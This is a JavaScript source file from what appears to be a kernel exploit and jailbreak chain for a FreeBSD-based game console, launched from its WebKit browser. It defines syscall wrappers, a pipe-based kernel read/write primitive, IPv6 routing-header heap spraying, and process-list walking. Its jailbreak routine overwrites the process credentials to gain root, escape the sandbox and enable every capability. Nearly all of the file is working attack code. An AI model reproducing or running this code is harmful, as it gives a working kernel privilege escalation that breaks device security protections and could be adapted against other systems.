//#region Constants
const PAGE_SIZE = 0x4000;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x120;
const TCP_INFO_SIZE = 0xec;

const F_SETFL = 4;
const O_RDWR = 2;
const O_NONBLOCK = 4;
const O_CREAT = 0x200;
const FIOSETOWN = 0x8004667c;

const AF_UNIX = 1;
const AF_INET = 2;
const AF_ROUTE = 17;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOCK_RAW = 3;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
const SO_SNDBUF = 0x1001;

const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

const TCP_INFO = 32;
const TCPS_ESTABLISHED = 4;

const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

const RTP = 0x100;
const RTP_SET = 1;
const CPU_WHICH_TID = 1;
const CPU_LEVEL_WHICH = 3;
const RTP_PRIO_REALTIME = 2;

const PROT_READ = 1;
const PROT_WRITE = 2;
const PROT_EXEC = 4;
const MAP_SHARED = 1;
const MAP_PRIVATE = 2;
const MAP_FIXED = 0x10;
const MAP_ANONYMOUS = 0x1000;

const SYSCORE_AUTHID = new BInt('0x4800000000000007');

const master_pipe = new Array(2);
const victim_pipe = new Array(2);

let spray_rthdr0_len = undefined;
let spray_rthdr0_addr = undefined;
let leak_rthdr0_addr = undefined;

let fdt_ofiles = undefined;
let allproc = undefined;

let kv = undefined;

fn.pthread_create = new NativeFunction(webkit_base.add(impl.wk_pthread_create), 'number');
fn.pthread_join = new NativeFunction(webkit_base.add(impl.wk_pthread_join), 'number');

fn.read = new NativeFunction(0x3, 'bint');
fn.write = new NativeFunction(0x4, 'bint');
fn.open = new NativeFunction(0x5, 'number');
fn.close = new NativeFunction(0x6, 'number');
fn.setuid = new NativeFunction(0x17, 'number');
fn.ioctl = new NativeFunction(0x36, 'number');
fn.munmap = new NativeFunction(0x49, 'number');
fn.mprotect = new NativeFunction(0x4a, 'number');
fn.madvise = new NativeFunction(0x4b, 'number');
fn.fcntl = new NativeFunction(0x5c, 'number');
fn.socket = new NativeFunction(0x61, 'number');
fn.connect = new NativeFunction(0x62, 'number');
fn.getuid = new NativeFunction(0x18, 'number');
fn.socketpair = new NativeFunction(0x87, 'number');
fn.setsockopt = new NativeFunction(0x69, 'number');
fn.getsockopt = new NativeFunction(0x76, 'number');
fn.sysctl = new NativeFunction(0xca, 'number');
fn.sched_yield = new NativeFunction(0x14b, 'number');
fn.rtprio_thread = new NativeFunction(0x1d2, 'number');
fn.cpuset_setaffinity = new NativeFunction(0x1e8, 'number');
fn.mmap = new NativeFunction(0x1dd, 'bint');
fn.mname = new NativeFunction(0x24c, 'number');
fn.jitshm_create = new NativeFunction(0x215, 'number');
fn.kexec = new NativeFunction(0x295, 'number');
//#endregion
//#region Classes
class KernelView extends DataView {
  constructor(master_pipe, victim_pipe) {
    super(new ArrayBuffer(8));

    if (!Array.isArray(master_pipe) || master_pipe.length !== 2) {
      throw new Error('pipe should have 2 fds for r/w');
    }

    if (!Array.isArray(victim_pipe) || victim_pipe.length !== 2) {
      throw new Error('pipe should have 2 fds for r/w');
    }

    this.master_pipe = master_pipe.slice();
    this.victim_pipe = victim_pipe.slice();

    if (fn.fcntl.invoke(this.master_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.master_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);
    }

    if (fn.fcntl.invoke(this.victim_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.victim_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.victim_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.victim_pipe[1]}`);
    }

    this.pipe_buf = pipebuf.new();
    this.pipe_buf.size = PAGE_SIZE;
  }

  free() {
    mem.free(this.pipe_buf.addr);
  }

  get dv_backing() {
    return this.buffer.data();
  }

  get pipe_backing() {
    return this.pipe_buf.buffer;
  }

  set pipe_backing(addr) {
    if (addr.eq(0)) {
      throw new Error('Empty addr !!');
    }

    this.pipe_buf.buffer = addr;
  }

  get pipe_count() {
    return this.pipe_buf.cnt;
  }

  set pipe_count(count) {
    if (count < 0 && count > 0xffffffff) {
      throw new RangeError(`count ${count} out of range !!`);
    }

    this.pipe_buf.cnt = count;
  }

  flush() {
    if (fn.write.invoke(this.master_pipe[1], this.pipe_buf.addr, pipebuf.sizeof) === -1n) {
      throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);
    }

    if (fn.read.invoke(this.master_pipe[0], this.pipe_buf.addr, pipebuf.sizeof) === -1n) {
      throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);
    }
  }

  kread(dst, src, size) {
    this.pipe_backing = src;
    this.pipe_count = size;
    this.flush();

    const n = fn.read.invoke(this.victim_pipe[0], dst, size);
    if (n.eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${this.victim_pipe[0]} !!`);
    }

    return n;
  }

  kwrite(dst, src, size) {
    this.pipe_backing = dst;
    this.pipe_count = size;
    this.flush();

    const n = fn.write.invoke(this.victim_pipe[1], src, size);
    if (n.eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${this.victim_pipe[1]} !!`);
    }

    return n;
  }

  getFloat32(byteOffset, littleEndian = false) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return super.getFloat32(0, littleEndian);
  }

  getFloat64(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);

    return super.getFloat64(0, littleEndian);
  }

  getInt8(byteOffset) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);

    return super.getInt8(0);
  }

  getInt16(byteOffset, littleEndian = false) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);

    return super.getInt16(0, littleEndian);
  }

  getInt32(byteOffset, littleEndian = false) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return super.getInt32(0, littleEndian);
  }

  getUint8(byteOffset) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);

    return super.getUint8(0);
  }

  getUint16(byteOffset, littleEndian = false) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);

    return super.getUint16(0, littleEndian);
  }

  getUint32(byteOffset, littleEndian = false) {
    super.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return super.getUint32(0, littleEndian);
  }

  getBInt(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);

    return super.getBInt(0, littleEndian);
  }

  setFloat32(byteOffset, value, littleEndian = false) {
    super.setBInt(0, 0, true);
    super.setFloat32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setFloat64(byteOffset, value, littleEndian = false) {
    super.setFloat64(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
  }

  setInt8(byteOffset, value) {
    super.setBInt(0, 0, true);
    super.setInt8(0, value);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
  }

  setInt16(byteOffset, value, littleEndian = false) {
    super.setBInt(0, 0, true);
    super.setInt16(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
  }

  setInt32(byteOffset, value, littleEndian = false) {
    super.setBInt(0, 0, true);
    super.setInt32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setUint8(byteOffset, value) {
    super.setBInt(0, 0, true);
    super.setUint8(0, value);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
  }

  setUint16(byteOffset, value, littleEndian = false) {
    super.setBInt(0, 0, true);
    super.setUint16(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
  }

  setUint32(byteOffset, value, littleEndian = false) {
    super.setBInt(0, 0, true);
    super.setUint32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setBInt(byteOffset, value, littleEndian = false) {
    super.setBInt(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
  }
}
//#endregion
//#region Functions
function pin_to_core(core) {
  const mask = cpuset.new();

  mask.bits0 = 1 << core;

  if (fn.cpuset_setaffinity.invoke(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, cpuset.sizeof, mask.addr) === -1) {
    throw new SyscallError(`Unable to setaffinity to core ${core}`);
  }

  mem.free(mask.addr);
}

function set_rtprio(value) {
  const prio = rtprio.new();

  prio.type = RTP_PRIO_REALTIME;
  prio.prio = value;

  if (fn.rtprio_thread.invoke(RTP_SET, 0, prio.addr) === -1) {
    throw new SyscallError(`Unable to set priority to ${value}`);
  }

  mem.free(prio.addr);
}

function build_rthdr(addr, size) {
  mem.bset(addr, size);

  const rthdr0 = ip6_rthdr0.new(addr);

  const in6_count = Math.floor((size - ip6_rthdr0.sizeof) / in6_addr.sizeof);

  rthdr0.ip6r0_nxt = 0;
  rthdr0.ip6r0_len = in6_count * 2;
  rthdr0.ip6r0_type = 0;
  rthdr0.ip6r0_segleft = in6_count;

  return ip6_rthdr0.sizeof + in6_addr.sizeof * in6_count;
}

function get_rthdr(sock, size) {
  const leak_rthdr0_len_addr = mem.alloc(4);
  arw.view(leak_rthdr0_len_addr).setInt32(0, size, true);

  if (fn.getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0_addr, leak_rthdr0_len_addr) === -1) {
    throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
  }

  const leak_rthdr0_len = arw.view(leak_rthdr0_len_addr).getInt32(0, true);

  mem.free(leak_rthdr0_len_addr);

  return leak_rthdr0_len;
}

function set_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr0_addr, spray_rthdr0_len) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function free_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function make_socket(domain, type, protocol = 0) {
  const sock = fn.socket.invoke(domain, type, protocol);
  if (sock === -1) {
    throw new SyscallError('Unable to create socket !!');
  }

  return sock;
}

function make_socketpair(domain, type, protocol = 0) {
  const pair_addr = mem.alloc(8);

  if (fn.socketpair.invoke(domain, type, protocol, pair_addr) === -1) {
    throw new SyscallError('Unable to create socket pair !!');
  }

  const sock0 = arw.view(pair_addr).getInt32(0, true);
  const sock1 = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  return [sock0, sock1];
}

function make_karw_pipe() {
  [master_pipe[0], master_pipe[1]] = make_pipe();
  [victim_pipe[0], victim_pipe[1]] = make_pipe();

  logger.debug(`master_pipe: ${master_pipe}`);
  logger.debug(`victim_pipe: ${victim_pipe}`);
}

function free_karw_pipe() {
  if (kv === undefined) {
    for (const fd of master_pipe) {
      if (!Number.isFinite(fd) || fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }

    for (const fd of victim_pipe) {
      if (!Number.isFinite(fd) || fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

function name2oid(name) {
  if (typeof name !== 'string') {
    throw new Error('Not a string !!');
  }

  if (name.length === 0) {
    throw new Error('Empty string !!');
  }

  const parts = name.split('.');
  if (parts.some((part) => part.trim().length === 0)) {
    throw new Error('Invalid format !!');
  }

  const oid = new Uint32Array([0, 3]); // sysctl.name2oid
  const mib = new Uint32Array(parts.length);

  const mib_len = mem.alloc(8);
  arw.view(mib_len).setUint32(0, mib.byteLength, true);

  if (fn.sysctl.invoke(oid.buffer.data(), oid.length, mib.buffer.data(), mib_len, name, name.length) === -1) {
    throw new SyscallError('Unable to sysctl !!');
  }

  mem.free(mib_len);

  return mib;
}

function oidfmt(oid) {
  if (oid.length === 0) {
    throw new Error('Empty oid !!');
  }

  const oid2kind = new Uint32Array([0, 4, ...oid]); // sysctl.oidfmt
  const out = new Uint32Array(2);

  const out_len = mem.alloc(8);
  arw.view(out_len).setUint32(0, out.byteLength, true);

  logger.debug(oid2kind.hex());

  if (fn.sysctl.invoke(oid2kind.buffer.data(), oid2kind.length, out.buffer.data(), out_len, 0, 0) === -1) {
    throw new SyscallError('Unable to sysctl !!');
  }

  return { kind: out[0], fmt: String.fromCharCode(out[1]) };
}

function kview(addr) {
  if (kv === undefined) {
    throw new Error('Empty kv !!');
  }

  if (kv.pipe_backing !== addr) {
    kv.pipe_backing = addr;
  }

  return kv;
}

function fget(fd) {
  return kview(fdt_ofiles).getBInt(fd * k_filedesc_sizeof, true);
}

function fput(fd, fp) {
  return kview(fdt_ofiles).getBInt(fd * k_filedesc_sizeof, fp, true);
}

function fhold(fp) {
  const f_count = kview(fp).getInt32(0x28, true);
  kview(fp).setInt32(0x28, f_count + 1, true);
}

function get_in6p_outputopts(fd) {
  const fp = fget(fd);
  const f_data = kview(fp).getBInt(0, true);
  const so_pcb = kview(f_data).getBInt(0x18, true);
  return kview(so_pcb).getBInt(k_in6p_outputopts, true); // in6p_outputopts
}

function get_pktinfo_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBInt(0x10, true); // ip6po_pktinfo
}

function get_rthdr_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBInt(k_ip6po_rthdr, true); // ip6po_rthdr
}

function remove_pktinfo_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBInt(0x10, 0, true); // ip6po_pktinfo
}

function remove_rthdr_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBInt(k_ip6po_rthdr, 0, true); // ip6po_rthdr
}

function inc_karw_pipe_refcnt() {
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));
}

function pfind(pid) {
  let p = kview(allproc).getBInt(0, true);
  while (p.neq(0)) {
    const p_pid = kview(p).getInt32(k_proc_pid, true);
    if (p_pid === pid) break;

    p = kview(p).getBInt(0, true); // p_list.le_next
  }

  return p;
}

function find_all_proc() {
  if (allproc !== undefined) {
    return;
  }

  logger.info('Finding allproc...');

  const tmp_pipe = make_pipe();

  try {
    const pid = fn.getpid.invoke();
    const pid_addr = mem.alloc(4);
    arw.view(pid_addr).setInt32(0, pid, true);

    if (fn.ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr) === -1) {
      throw new SyscallError(`Unable to ioctl fd ${tmp_pipe[0]} !!`);
    }

    mem.free(pid_addr);

    const fp = fget(tmp_pipe[0]);
    const f_data = kview(fp).getBInt(0, true);
    const pipe_sigio = kview(f_data).getBInt(k_pipe_sigio, true);
    let p = kview(pipe_sigio).getBInt(0, true);

    const mask = new BInt('0xffffffff00000000');
    while (p.and(mask).neq(mask)) {
      p = kview(p).getBInt(8, true); // p_list.le_prev
    }

    allproc = p;
    logger.info(`allproc: ${allproc}`);
  } finally {
    for (const fd of tmp_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

function jailbreak() {
  logger.info('Initiate jailbreak...');

  const p = pfind(fn.getpid.invoke());
  const kp = pfind(0);

  // Patch credentials and capabilities
  const p_ucred = kview(p).getBInt(0x40, true);
  const kp_ucred = kview(kp).getBInt(0x40, true);

  const prison0 = kview(kp_ucred).getBInt(0x30, true);

  kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
  kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
  kview(p_ucred).setInt32(0x0c, 0, true); // cr_svuid
  kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
  kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
  kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
  kview(p_ucred).setBInt(0x30, prison0, true); // cr_prison
  kview(p_ucred).setBInt(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
  kview(p_ucred).setBInt(0x60, -1, true); // cr_sceCaps[1]
  kview(p_ucred).setBInt(0x68, -1, true); // cr_sceCaps[0]
  kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]

  patch_proc(p, kp);

  logger.info('Achieved jailbreak !!');
}

function is_elfldr_running() {
  let fd = -1;
  const addr = mem.alloc(16);

  try {
    const sockaddr = arw.view(addr);
    for (let i = 0; i < 16; i++) sockaddr.setUint8(i, 0);

    // sockaddr_in: length 16, AF_INET, port 9021, address 127.0.0.1.
    [16, 2, 0x23, 0x3d, 127, 0, 0, 1].forEach((value, index) => {
      sockaddr.setUint8(index, value);
    });

    fd = fn.socket.invoke(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return false;

    return fn.connect.invoke(fd, addr, 16) === 0;
  } catch (error) {
    logger.debug(`ELF Loader status check failed: ${error.message || error}`);
    return false;
  } finally {
    if (fd >= 0) {
      try {
        fn.close.invoke(fd);
      } catch (error) {}
    }
    mem.free(addr);
  }
}

async function kernel_main() {
  logger.info('===KERNEL===');

  // Match the reference host: an active ELF Loader means the jailbreak
  // environment is already prepared, so do not run the kernel exploit again.
  if (is_elfldr_running()) {
    logger.info('ELF Loader is already active on 127.0.0.1:9021. Skipping kernel exploit.');
    logger.info('===END===');
    return;
  }

  // Check the current WebKit process credentials before starting the exploit.
  // FreeBSD syscall 24 (0x18) is getuid().
  let currentUid = -1;
  try {
    currentUid = fn.getuid.invoke();
  } catch (error) {
    logger.debug(`getuid check failed; continuing normal exploit flow: ${error.message || error}`);
  }

  if (currentUid === 0) {
    logger.info('System is already jailbroken (uid 0). Skipping kernel exploit.');
    logger.info('===END===');
    return;
  }

  logger.info(`Current UID is ${currentUid}. Starting kernel exploit.`);
  await exploit();

  find_all_proc();

  // Keep the original post-exploit privilege check and jailbreak path unchanged.
  if (fn.setuid.invoke(0) === -1) {
    jailbreak();

    notify('Jailbroken !!');

    await post_jailbreak();
  }

  logger.info('===END===');
}
//#endregion
//#region Structs
const cpuset = new Struct('cpuset', [
  { type: 'Uint64', name: 'bits0' },
  { type: 'Uint64', name: 'bits1' },
]);

const rtprio = new Struct('rtprio', [
  { type: 'Uint16', name: 'type' },
  { type: 'Uint16', name: 'prio' },
]);

const in6_addr = new Struct('in6_addr', [{ type: 'Uint8', name: 's6_addr', count: 16 }]);

const ip6_rthdr0 = new Struct('ip6_rthdr0', [
  { type: 'Uint8', name: 'ip6r0_nxt' },
  { type: 'Uint8', name: 'ip6r0_len' },
  { type: 'Uint8', name: 'ip6r0_type' },
  { type: 'Uint8', name: 'ip6r0_segleft' },
  { type: 'Uint32', name: 'ip6r0_reserved' },
]);

const sockaddr_in = new Struct('sockaddr_in', [
  { type: 'Uint8', name: 'sin_len' },
  { type: 'Uint8', name: 'sin_family' },
  { type: 'Uint16', name: 'sin_port' },
  { type: 'Uint32', name: 'sin_addr' },
  { type: 'Uint8', name: 'sin_zero', count: 8 },
]);

const pipebuf = new Struct('pipebuf', [
  { type: 'Uint32', name: 'cnt' },
  { type: 'Uint32', name: 'in' },
  { type: 'Uint32', name: 'out' },
  { type: 'Uint32', name: 'size' },
  { type: 'Uint64', name: 'buffer' },
]);
//#endregion
